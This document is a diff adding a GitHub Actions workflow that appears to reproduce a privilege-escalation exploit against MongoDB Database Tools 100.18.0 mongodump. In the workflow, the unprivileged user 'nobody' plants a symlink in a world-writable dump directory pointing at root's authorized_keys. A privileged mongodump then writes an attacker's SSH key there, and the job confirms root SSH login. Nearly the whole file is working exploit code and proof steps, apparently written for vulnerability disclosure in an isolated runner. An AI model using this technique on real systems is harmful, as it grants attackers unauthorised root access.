@@ -1,0 +1,257 @@
+name: MongoDB Agent 6 mongodump authorized_keys escalation
+
+on:
+  push:
+    branches:
+      - mongodb-agent6-mongodump-symlink-20260830
+
+permissions:
+  contents: read
+
+jobs:
+  authorized-keys-escalation:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install sshd if needed
+        shell: bash
+        run: |
+          set -euo pipefail
+          if ! command -v sshd >/dev/null 2>&1; then
+            sudo apt-get update
+            sudo DEBIAN_FRONTEND=noninteractive apt-get install -y openssh-server
+          fi
+          command -v ssh
+          command -v sshd
+          command -v ssh-keygen
+
+      - name: Download official Database Tools 100.18.0
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p evidence/runtime
+          cd evidence/runtime
+          url='https://fastdl.mongodb.org/tools/db/mongodb-database-tools-ubuntu2404-x86_64-100.18.0.tgz'
+          curl --retry 3 --retry-all-errors --fail --silent --show-error --location "$url" -o tools.tgz
+          sha256sum tools.tgz | tee official-tools-archive.sha256
+          tar -xzf tools.tgz
+          root="$(find . -maxdepth 1 -type d -name 'mongodb-database-tools-*100.18.0' -print -quit)"
+          test -n "$root"
+          printf '%s\n' "$root" > binary-root.txt
+          "$root/bin/mongodump" --version | tee mongodump-version.txt
+          "$root/bin/bsondump" --version | tee bsondump-version.txt
+
+      - name: Start local MongoDB and generate attacker SSH key
+        shell: bash
+        run: |
+          set -euo pipefail
+          docker pull mongo:8.0
+          docker run --rm -d --name agent6-mongo -p 127.0.0.1:27017:27017 mongo:8.0 --bind_ip_all
+          for i in $(seq 1 60); do
+            if docker exec agent6-mongo mongosh --quiet --eval 'db.runCommand({ping:1}).ok' 2>/dev/null | grep -q '^1$'; then
+              break
+            fi
+            sleep 1
+          done
+
+          mkdir -p evidence/runtime/keys
+          ssh-keygen -q -t ed25519 -N '' -C 'agent6-attacker' -f evidence/runtime/keys/attacker_ed25519
+          pub="$(cat evidence/runtime/keys/attacker_ed25519.pub)"
+          printf '%s\n' "$pub" | tee evidence/runtime/attacker-public-key.txt
+
+          payload_json="$(python3 - "$pub" <<'PY'
+import json, sys
+print(json.dumps('\n' + sys.argv[1] + '\n'))
+PY
+)"
+          docker exec agent6-mongo mongosh --quiet --eval "
+            db = db.getSiblingDB('agent6');
+            db.probe.drop();
+            db.probe.insertOne({_id:1, payload:${payload_json}});
+            printjson(db.probe.findOne({_id:1}));
+          " | tee evidence/runtime/seed-document.txt
+
+      - name: Start isolated root SSH service and prove attacker key is initially rejected
+        shell: bash
+        run: |
+          set -euo pipefail
+          sudo mkdir -p /root/.ssh /run/sshd
+          sudo chmod 0700 /root/.ssh
+          sudo sh -c ': > /root/.ssh/authorized_keys'
+          sudo chown root:root /root/.ssh/authorized_keys
+          sudo chmod 0600 /root/.ssh/authorized_keys
+
+          ssh-keygen -q -t ed25519 -N '' -f evidence/runtime/sshd_host_key
+          sudo chown root:root evidence/runtime/sshd_host_key
+          sudo chmod 0600 evidence/runtime/sshd_host_key
+
+          cat > evidence/runtime/sshd_config <<EOF
+          Port 2222
+          ListenAddress 127.0.0.1
+          HostKey $(pwd)/evidence/runtime/sshd_host_key
+          PidFile /tmp/agent6-sshd.pid
+          AuthorizedKeysFile /root/.ssh/authorized_keys
+          PermitRootLogin yes
+          PubkeyAuthentication yes
+          PasswordAuthentication no
+          KbdInteractiveAuthentication no
+          ChallengeResponseAuthentication no
+          UsePAM no
+          StrictModes yes
+          LogLevel VERBOSE
+          EOF
+
+          sudo /usr/sbin/sshd -f "$(pwd)/evidence/runtime/sshd_config" -E "$(pwd)/evidence/runtime/sshd.log"
+          for i in $(seq 1 40); do
+            if nc -z 127.0.0.1 2222; then break; fi
+            sleep 0.25
+          done
+
+          set +e
+          ssh -i evidence/runtime/keys/attacker_ed25519 \
+            -p 2222 \
+            -o IdentitiesOnly=yes \
+            -o BatchMode=yes \
+            -o StrictHostKeyChecking=no \
+            -o UserKnownHostsFile=/dev/null \
+            -o ConnectTimeout=3 \
+            root@127.0.0.1 'id -u' \
+            > evidence/runtime/ssh-before.stdout \
+            2> evidence/runtime/ssh-before.stderr
+          rc=$?
+          set -e
+          printf 'ssh_before_exit=%s\n' "$rc" | tee evidence/runtime/ssh-before-result.txt
+          test "$rc" -ne 0
+
+      - name: Use attacker-controlled symlink so privileged mongodump overwrites root authorized_keys
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd evidence/runtime
+          root="$(cat binary-root.txt)"
+
+          shared='/tmp/agent6-shared-ssh'
+          out="$shared/out"
+          dbdir="$out/agent6"
+          target='/root/.ssh/authorized_keys'
+
+          sudo rm -rf "$shared"
+          sudo mkdir -p "$shared"
+          sudo chmod 0777 "$shared"
+
+          set +e
+          sudo -u nobody sh -c "printf 'ATTACKER_DIRECT_WRITE\n' > '$target'" 2>direct-write-denied.stderr
+          direct_rc=$?
+          set -e
+          printf 'direct_write_exit=%s\n' "$direct_rc" | tee direct-write-result.txt
+          test "$direct_rc" -ne 0
+
+          sudo -u nobody mkdir -p "$dbdir"
+          sudo -u nobody ln -s "$target" "$dbdir/probe.bson"
+          ls -ld "$shared" "$out" "$dbdir" | tee attacker-tree.txt
+          ls -l "$dbdir/probe.bson" | tee -a attacker-tree.txt
+          readlink "$dbdir/probe.bson" | tee -a attacker-tree.txt
+
+          sudo strace -f -o strace.txt -e trace=openat,open,creat,unlink,unlinkat,rename,renameat,renameat2 \
+            "$root/bin/mongodump" \
+              --host=127.0.0.1:27017 \
+              --db=agent6 \
+              --collection=probe \
+              --out="$out" \
+              >mongodump.stdout 2>mongodump.stderr
+          sudo chmod 0644 strace.txt || true
+
+          sudo cp "$target" authorized_keys_after.bin
+          sudo chown "$(id -u):$(id -g)" authorized_keys_after.bin
+          xxd -g1 authorized_keys_after.bin | tee authorized_keys_after.hex
+          strings -a authorized_keys_after.bin | tee authorized_keys_after.strings
+          grep -a -F 'ssh-ed25519 ' authorized_keys_after.bin | tee injected-key-line.txt
+          grep -F 'probe.bson' strace.txt | tee open-syscall.txt || true
+
+      - name: Prove SSH login as root succeeds with injected key
+        shell: bash
+        run: |
+          set -euo pipefail
+          set +e
+          ssh -i evidence/runtime/keys/attacker_ed25519 \
+            -p 2222 \
+            -o IdentitiesOnly=yes \
+            -o BatchMode=yes \
+            -o StrictHostKeyChecking=no \
+            -o UserKnownHostsFile=/dev/null \
+            -o ConnectTimeout=3 \
+            root@127.0.0.1 'id -u; id -un; printf ROOT_SSH_LOGIN_CONFIRMED' \
+            > evidence/runtime/ssh-after.stdout \
+            2> evidence/runtime/ssh-after.stderr
+          rc=$?
+          set -e
+          printf 'ssh_after_exit=%s\n' "$rc" | tee evidence/runtime/ssh-after-result.txt
+          cat evidence/runtime/ssh-after.stdout
+          cat evidence/runtime/ssh-after.stderr
+          test "$rc" -eq 0
+          grep -q '^0$' evidence/runtime/ssh-after.stdout
+          grep -q '^root$' evidence/runtime/ssh-after.stdout
+          grep -q 'ROOT_SSH_LOGIN_CONFIRMED' evidence/runtime/ssh-after.stdout
+
+          cat > evidence/runtime/results.txt <<EOF
+          OFFICIAL_TOOLS_VERSION=100.18.0
+          ATTACKER_DIRECT_WRITE_TO_ROOT_AUTHORIZED_KEYS_DENIED=yes
+          ATTACKER_CREATED_SYMLINK_INSIDE_DUMP_ROOT=yes
+          ATTACKER_CONTROLLED_DATABASE_STRING_CONTAINED_SSH_PUBLIC_KEY=yes
+          PRIVILEGED_MONGODUMP_FOLLOWED_SYMLINK=yes
+          ROOT_AUTHORIZED_KEYS_REPLACED_WITH_BSON_CONTAINING_VALID_KEY_LINE=yes
+          SSH_WITH_ATTACKER_KEY_BEFORE_EXPLOIT=denied
+          SSH_WITH_ATTACKER_KEY_AFTER_EXPLOIT=success
+          SSH_RESULTING_UID=0
+          VERDICT=ROOT_PRIVILEGE_ESCALATION_CONFIRMED
+          EOF
+          cat evidence/runtime/results.txt
+
+      - name: Cleanup
+        if: always()
+        shell: bash
+        run: |
+          docker rm -f agent6-mongo >/dev/null 2>&1 || true
+          if [ -f /tmp/agent6-sshd.pid ]; then sudo kill "$(cat /tmp/agent6-sshd.pid)" >/dev/null 2>&1 || true; fi
+          sudo rm -rf /root/.ssh/authorized_keys /tmp/agent6-shared-ssh
+
+      - name: Remove private key before artifact upload
+        if: always()
+        shell: bash
+        run: rm -f evidence/runtime/keys/attacker_ed25519
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: mongodb-agent6-mongodump-authorized-keys-root-escalation-100.18.0
+          path: |
+            evidence/runtime/results.txt
+            evidence/runtime/mongodump-version.txt
+            evidence/runtime/bsondump-version.txt
+            evidence/runtime/official-tools-archive.sha256
+            evidence/runtime/attacker-public-key.txt
+            evidence/runtime/seed-document.txt
+            evidence/runtime/ssh-before.stdout
+            evidence/runtime/ssh-before.stderr
+            evidence/runtime/ssh-before-result.txt
+            evidence/runtime/direct-write-denied.stderr
+            evidence/runtime/direct-write-result.txt
+            evidence/runtime/attacker-tree.txt
+            evidence/runtime/mongodump.stdout
+            evidence/runtime/mongodump.stderr
+            evidence/runtime/strace.txt
+            evidence/runtime/authorized_keys_after.bin
+            evidence/runtime/authorized_keys_after.hex
+            evidence/runtime/authorized_keys_after.strings
+            evidence/runtime/injected-key-line.txt
+            evidence/runtime/open-syscall.txt
+            evidence/runtime/ssh-after.stdout
+            evidence/runtime/ssh-after.stderr
+            evidence/runtime/ssh-after-result.txt
+            evidence/runtime/sshd.log
+            evidence/runtime/sshd_config
+          if-no-files-found: warn
+          retention-days: 7
